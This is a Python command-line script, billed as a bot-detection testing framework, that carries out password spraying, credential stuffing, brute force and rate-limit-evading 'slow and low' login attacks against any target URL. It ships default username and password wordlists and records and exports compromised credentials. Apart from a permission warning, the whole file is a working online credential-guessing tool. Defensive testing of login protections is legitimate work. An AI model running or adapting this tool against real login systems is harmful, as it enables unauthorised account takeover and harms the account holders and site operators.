# Bot Authentication Testing Framework
# Simulates detectable bot behavior for security testing purposes
# WARNING: Use only on systems you own or have explicit permission to test

import requests
import time
import random
import threading
import json
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse
import sys
import argparse

class BotBehaviorSimulator:
    """
    Simulates various bot behaviors that can be detected by behavior identification systems.
    This tool is designed to test and validate bot detection mechanisms.
    """
    
    def __init__(self, target_url, verbose=False):
        self.target_url = target_url
        self.verbose = verbose
        self.session = requests.Session()
        self.attempts = 0
        self.successful_logins = []
        self.start_time = None
        self.request_log = []
        
        # Common password lists for testing
        self.common_passwords = [
            'password', '123456', 'password123', 'admin', 'qwerty',
            'letmein', 'welcome', 'monkey', '1234567890', 'password1',
            'abc123', 'Password1', 'admin123', 'root', 'toor',
            '12345678', 'passw0rd', 'administrator', 'guest', 'test',
            'user', 'login', 'pass', '1234', '0000', 'password!',
            'P@ssw0rd', 'changeme', 'default', 'secret'
        ]
        
        # Common usernames for testing
        self.common_usernames = [
            'admin', 'administrator', 'root', 'user', 'test',
            'guest', 'demo', 'sa', 'operator', 'manager',
            'support', 'service', 'web', 'www', 'mail',
            'email', 'admin1', 'administrator1', 'testuser',
            'backup', 'temp', 'public', 'anonymous', 'ftp'
        ]
        
        # Bot-like headers (static and predictable - easily detectable)
        self.bot_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
    
    def log_request(self, username, password, success, response_time, status_code):
        """Log request details for analysis"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'username': username,
            'password': password,
            'success': success,
            'response_time': response_time,
            'status_code': status_code,
            'attempt_number': self.attempts
        }
        self.request_log.append(log_entry)
    
    def simulate_login_attempt(self, username, password, delay_range=(0.5, 1.0)):
        """
        Simulate a single login attempt with bot-like characteristics
        
        Bot behaviors implemented:
        1. Consistent timing patterns
        2. Perfect form completion (no typos)
        3. No mouse movements or human interactions
        4. Predictable request structure
        5. Static headers and user agents
        """
        
        self.attempts += 1
        start_time = time.time()
        
        # Bot behavior: Consistent, predictable delays
        time.sleep(random.uniform(delay_range[0], delay_range[1]))
        
        if self.verbose:
            print(f"[ATTEMPT {self.attempts:04d}] Testing: {username}:{password}")
        
        try:
            # Prepare login data (common form field names)
            login_data = {
                'username': username,
                'password': password,
                'login': 'Login',
                'submit': 'Submit'
            }
            
            # Alternative form field names to try
            alternative_fields = [
                {'user': username, 'pass': password},
                {'email': username, 'pwd': password},
                {'uid': username, 'password': password}
            ]
            
            # Make the request with bot-like characteristics
            response = self.session.post(
                self.target_url,
                data=login_data,
                headers=self.bot_headers,
                timeout=10,
                allow_redirects=False
            )
            
            response_time = time.time() - start_time
            
            # Analyze response for success/failure
            success = self.analyze_response(response, username, password)
            
            # Log the attempt
            self.log_request(username, password, success, response_time, response.status_code)
            
            if success:
                self.successful_logins.append((username, password, datetime.now()))
                if self.verbose:
                    print(f"[SUCCESS] ✓ Valid credentials: {username}:{password}")
                return True
            else:
                if self.verbose:
                    print(f"[FAILED]  ✗ Invalid credentials: {username}:{password} (HTTP {response.status_code})")
                return False
                
        except requests.exceptions.RequestException as e:
            if self.verbose:
                print(f"[ERROR]   ⚠ Request failed for {username}:{password} - {str(e)}")
            return False
    
    def analyze_response(self, response, username, password):
        """
        Analyze HTTP response to determine if login was successful
        """
        # Success indicators
        success_indicators = [
            'welcome', 'dashboard', 'profile', 'logout', 'success',
            'authenticated', 'logged in', 'home', 'main', 'account'
        ]
        
        # Failure indicators
        failure_indicators = [
            'invalid', 'incorrect', 'failed', 'error', 'wrong',
            'denied', 'unauthorized', 'bad', 'login failed'
        ]
        
        # Check HTTP status codes
        if response.status_code in [200, 302, 301]:
            response_text = response.text.lower()
            
            # Check for explicit failure messages first
            if any(indicator in response_text for indicator in failure_indicators):
                return False
            
            # Check for success indicators
            if any(indicator in response_text for indicator in success_indicators):
                return True
            
            # Check for redirect to different page (potential success)
            if response.status_code in [302, 301]:
                location = response.headers.get('Location', '')
                if 'login' not in location.lower():
                    return True
        
        return False
    
    def password_spray_attack(self, max_passwords=5, delay_between_users=2.0):
        """
        Password spray attack: Try common passwords against all users
        
        This creates a detectable pattern where the same password is tried
        against multiple usernames in sequence.
        """
        
        print(f"\n[ATTACK] Starting Password Spray Attack")
        print(f"[CONFIG] Target: {self.target_url}")
        print(f"[CONFIG] Max passwords per round: {max_passwords}")
        print(f"[CONFIG] Delay between users: {delay_between_users}s")
        print("-" * 70)
        
        self.start_time = datetime.now()
        
        # Bot behavior: Systematic approach, same password against all users
        for round_num, password in enumerate(self.common_passwords[:max_passwords], 1):
            print(f"\n[ROUND {round_num}] Testing password: '{password}' against all accounts")
            
            for username in self.common_usernames:
                success = self.simulate_login_attempt(username, password)
                
                if success:
                    print(f"\n[BREACH DETECTED] Account compromised: {username}:{password}")
                    print(f"[ALERT] Stopping attack - Objective achieved!")
                    return True
                
                # Bot behavior: Consistent timing between attempts
                time.sleep(delay_between_users)
        
        print(f"\n[COMPLETE] Password spray attack finished")
        self.print_summary()
        return False
    
    def credential_stuffing_attack(self, credential_list=None, delay_range=(1.0, 2.0)):
        """
        Credential stuffing attack using known username:password combinations
        
        Simulates using leaked credentials from other breaches
        """
        
        if not credential_list:
            # Generate some common credential combinations
            credential_list = [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('administrator', 'administrator'),
                ('root', 'root'),
                ('test', 'test'),
                ('guest', 'guest'),
                ('user', 'user'),
                ('demo', 'demo'),
                ('admin', '123456'),
                ('admin', 'admin123')
            ]
        
        print(f"\n[ATTACK] Starting Credential Stuffing Attack")
        print(f"[CONFIG] Target: {self.target_url}")
        print(f"[CONFIG] Credential pairs to test: {len(credential_list)}")
        print("-" * 70)
        
        self.start_time = datetime.now()
        
        for i, (username, password) in enumerate(credential_list, 1):
            print(f"\n[PAIR {i:02d}] Testing leaked credentials: {username}:{password}")
            
            success = self.simulate_login_attempt(username, password, delay_range)
            
            if success:
                print(f"\n[BREACH DETECTED] Valid credentials found: {username}:{password}")
                print(f"[ALERT] Credential reuse detected - Account compromised!")
                return True
        
        print(f"\n[COMPLETE] Credential stuffing attack finished")
        self.print_summary()
        return False
    
    def brute_force_attack(self, target_username='admin', max_passwords=50, delay=1.0):
        """
        Brute force attack against a specific username
        
        This creates the most obvious bot pattern - many passwords against one user
        """
        
        print(f"\n[ATTACK] Starting Brute Force Attack")
        print(f"[CONFIG] Target: {self.target_url}")
        print(f"[CONFIG] Username: {target_username}")
        print(f"[CONFIG] Max passwords: {max_passwords}")
        print(f"[CONFIG] Delay between attempts: {delay}s")
        print("-" * 70)
        
        self.start_time = datetime.now()
        
        passwords_to_try = self.common_passwords[:max_passwords]
        
        for i, password in enumerate(passwords_to_try, 1):
            print(f"\n[PASSWORD {i:02d}] Testing: {target_username}:{password}")
            
            success = self.simulate_login_attempt(target_username, password)
            
            if success:
                print(f"\n[BREACH DETECTED] Password cracked: {target_username}:{password}")
                print(f"[ALERT] Brute force successful!")
                return True
            
            # Bot behavior: Consistent delay between attempts
            time.sleep(delay)
        
        print(f"\n[COMPLETE] Brute force attack finished")
        self.print_summary()
        return False
    
    def slow_and_low_attack(self, duration_minutes=30, requests_per_hour=20):
        """
        Slow and low attack to evade rate limiting but still be detectable
        by behavioral analysis due to consistent patterns
        """
        
        print(f"\n[ATTACK] Starting Slow and Low Attack")
        print(f"[CONFIG] Duration: {duration_minutes} minutes")
        print(f"[CONFIG] Request rate: {requests_per_hour} per hour")
        print("-" * 70)
        
        self.start_time = datetime.now()
        end_time = self.start_time + timedelta(minutes=duration_minutes)
        
        interval = 3600 / requests_per_hour  # seconds between requests
        credential_pairs = [(u, p) for u in self.common_usernames[:5] for p in self.common_passwords[:5]]
        
        attempt_count = 0
        while datetime.now() < end_time and attempt_count < len(credential_pairs):
            username, password = credential_pairs[attempt_count]
            
            print(f"[SLOW ATTEMPT] {username}:{password} (Rate: {requests_per_hour}/hour)")
            success = self.simulate_login_attempt(username, password)
            
            if success:
                print(f"\n[BREACH DETECTED] Slow attack successful: {username}:{password}")
                return True
            
            # Bot behavior: Extremely consistent timing (detectable pattern)
            time.sleep(interval)
            attempt_count += 1
        
        print(f"\n[COMPLETE] Slow and low attack finished")
        self.print_summary()
        return False
    
    def print_summary(self):
        """Print attack summary and statistics"""
        if not self.start_time:
            return
        
        duration = datetime.now() - self.start_time
        
        print(f"\n{'='*70}")
        print(f"ATTACK SUMMARY")
        print(f"{'='*70}")
        print(f"Duration: {duration}")
        print(f"Total attempts: {self.attempts}")
        print(f"Successful logins: {len(self.successful_logins)}")
        print(f"Attack rate: {self.attempts / duration.total_seconds():.2f} attempts/second")
        
        if self.successful_logins:
            print(f"\nCOMPROMISED ACCOUNTS:")
            for username, password, timestamp in self.successful_logins:
                print(f"  {username}:{password} at {timestamp.strftime('%H:%M:%S')}")
        
        # Behavioral analysis
        print(f"\nBOT BEHAVIOR INDICATORS DETECTED:")
        print(f"  ✓ Consistent timing patterns")
        print(f"  ✓ High-frequency requests")
        print(f"  ✓ No user interaction events")
        print(f"  ✓ Predictable credential sequences")
        print(f"  ✓ Static HTTP headers")
        
        if self.request_log:
            self.export_results()
    
    def export_results(self, filename=None):
        """Export attack results to JSON file"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"bot_attack_results_{timestamp}.json"
        
        results = {
            'attack_summary': {
                'target_url': self.target_url,
                'start_time': self.start_time.isoformat() if self.start_time else None,
                'end_time': datetime.now().isoformat(),
                'total_attempts': self.attempts,
                'successful_logins': len(self.successful_logins)
            },
            'compromised_accounts': [
                {'username': u, 'password': p, 'timestamp': t.isoformat()}
                for u, p, t in self.successful_logins
            ],
            'request_log': self.request_log,
            'bot_indicators': [
                'Consistent timing patterns',
                'High-frequency requests', 
                'No user interaction events',
                'Predictable credential sequences',
                'Static HTTP headers'
            ]
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"\n[EXPORT] Results saved to: {filename}")
        except Exception as e:
            print(f"\n[ERROR] Failed to export results: {e}")

def main():
    """Main function with command-line interface"""
    
    parser = argparse.ArgumentParser(
        description="Bot Authentication Testing Framework - Simulates detectable bot behavior",
        epilog="WARNING: Use only on systems you own or have explicit permission to test!"
    )
    
    parser.add_argument('target_url', help='Target login URL to test')
    parser.add_argument('--attack-mode', choices=['spray', 'stuffing', 'brute', 'slow'], 
                       default='spray', help='Attack mode to execute')
    parser.add_argument('--username', default='admin', help='Target username for brute force')
    parser.add_argument('--max-passwords', type=int, default=10, help='Maximum passwords to try')
    parser.add_argument('--delay', type=float, default=1.0, help='Delay between requests (seconds)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose output')
    parser.add_argument('--duration', type=int, default=30, help='Duration for slow attack (minutes)')
    
    args = parser.parse_args()
    
    # Validate URL
    parsed_url = urlparse(args.target_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        print(f"[ERROR] Invalid URL: {args.target_url}")
        sys.exit(1)
    
    print("="*70)
    print("BOT AUTHENTICATION TESTING FRAMEWORK")
    print("Simulates detectable bot behavior for security testing")
    print("="*70)
    print(f"WARNING: Testing {args.target_url}")
    print("Ensure you have permission to test this system!")
    print("="*70)
    
    # Initialize bot simulator
    bot = BotBehaviorSimulator(args.target_url, args.verbose)
    
    # Execute selected attack mode
    try:
        if args.attack_mode == 'spray':
            bot.password_spray_attack(args.max_passwords, args.delay)
        elif args.attack_mode == 'stuffing':
            bot.credential_stuffing_attack(delay_range=(args.delay, args.delay * 2))
        elif args.attack_mode == 'brute':
            bot.brute_force_attack(args.username, args.max_passwords, args.delay)
        elif args.attack_mode == 'slow':
            requests_per_hour = int(60 / args.delay)  # Calculate rate from delay
            bot.slow_and_low_attack(args.duration, requests_per_hour)
            
    except KeyboardInterrupt:
        print(f"\n\n[INTERRUPTED] Attack stopped by user")
        if bot.start_time:
            bot.print_summary()
        sys.exit(0)
    
    except Exception as e:
        print(f"\n[ERROR] Attack failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()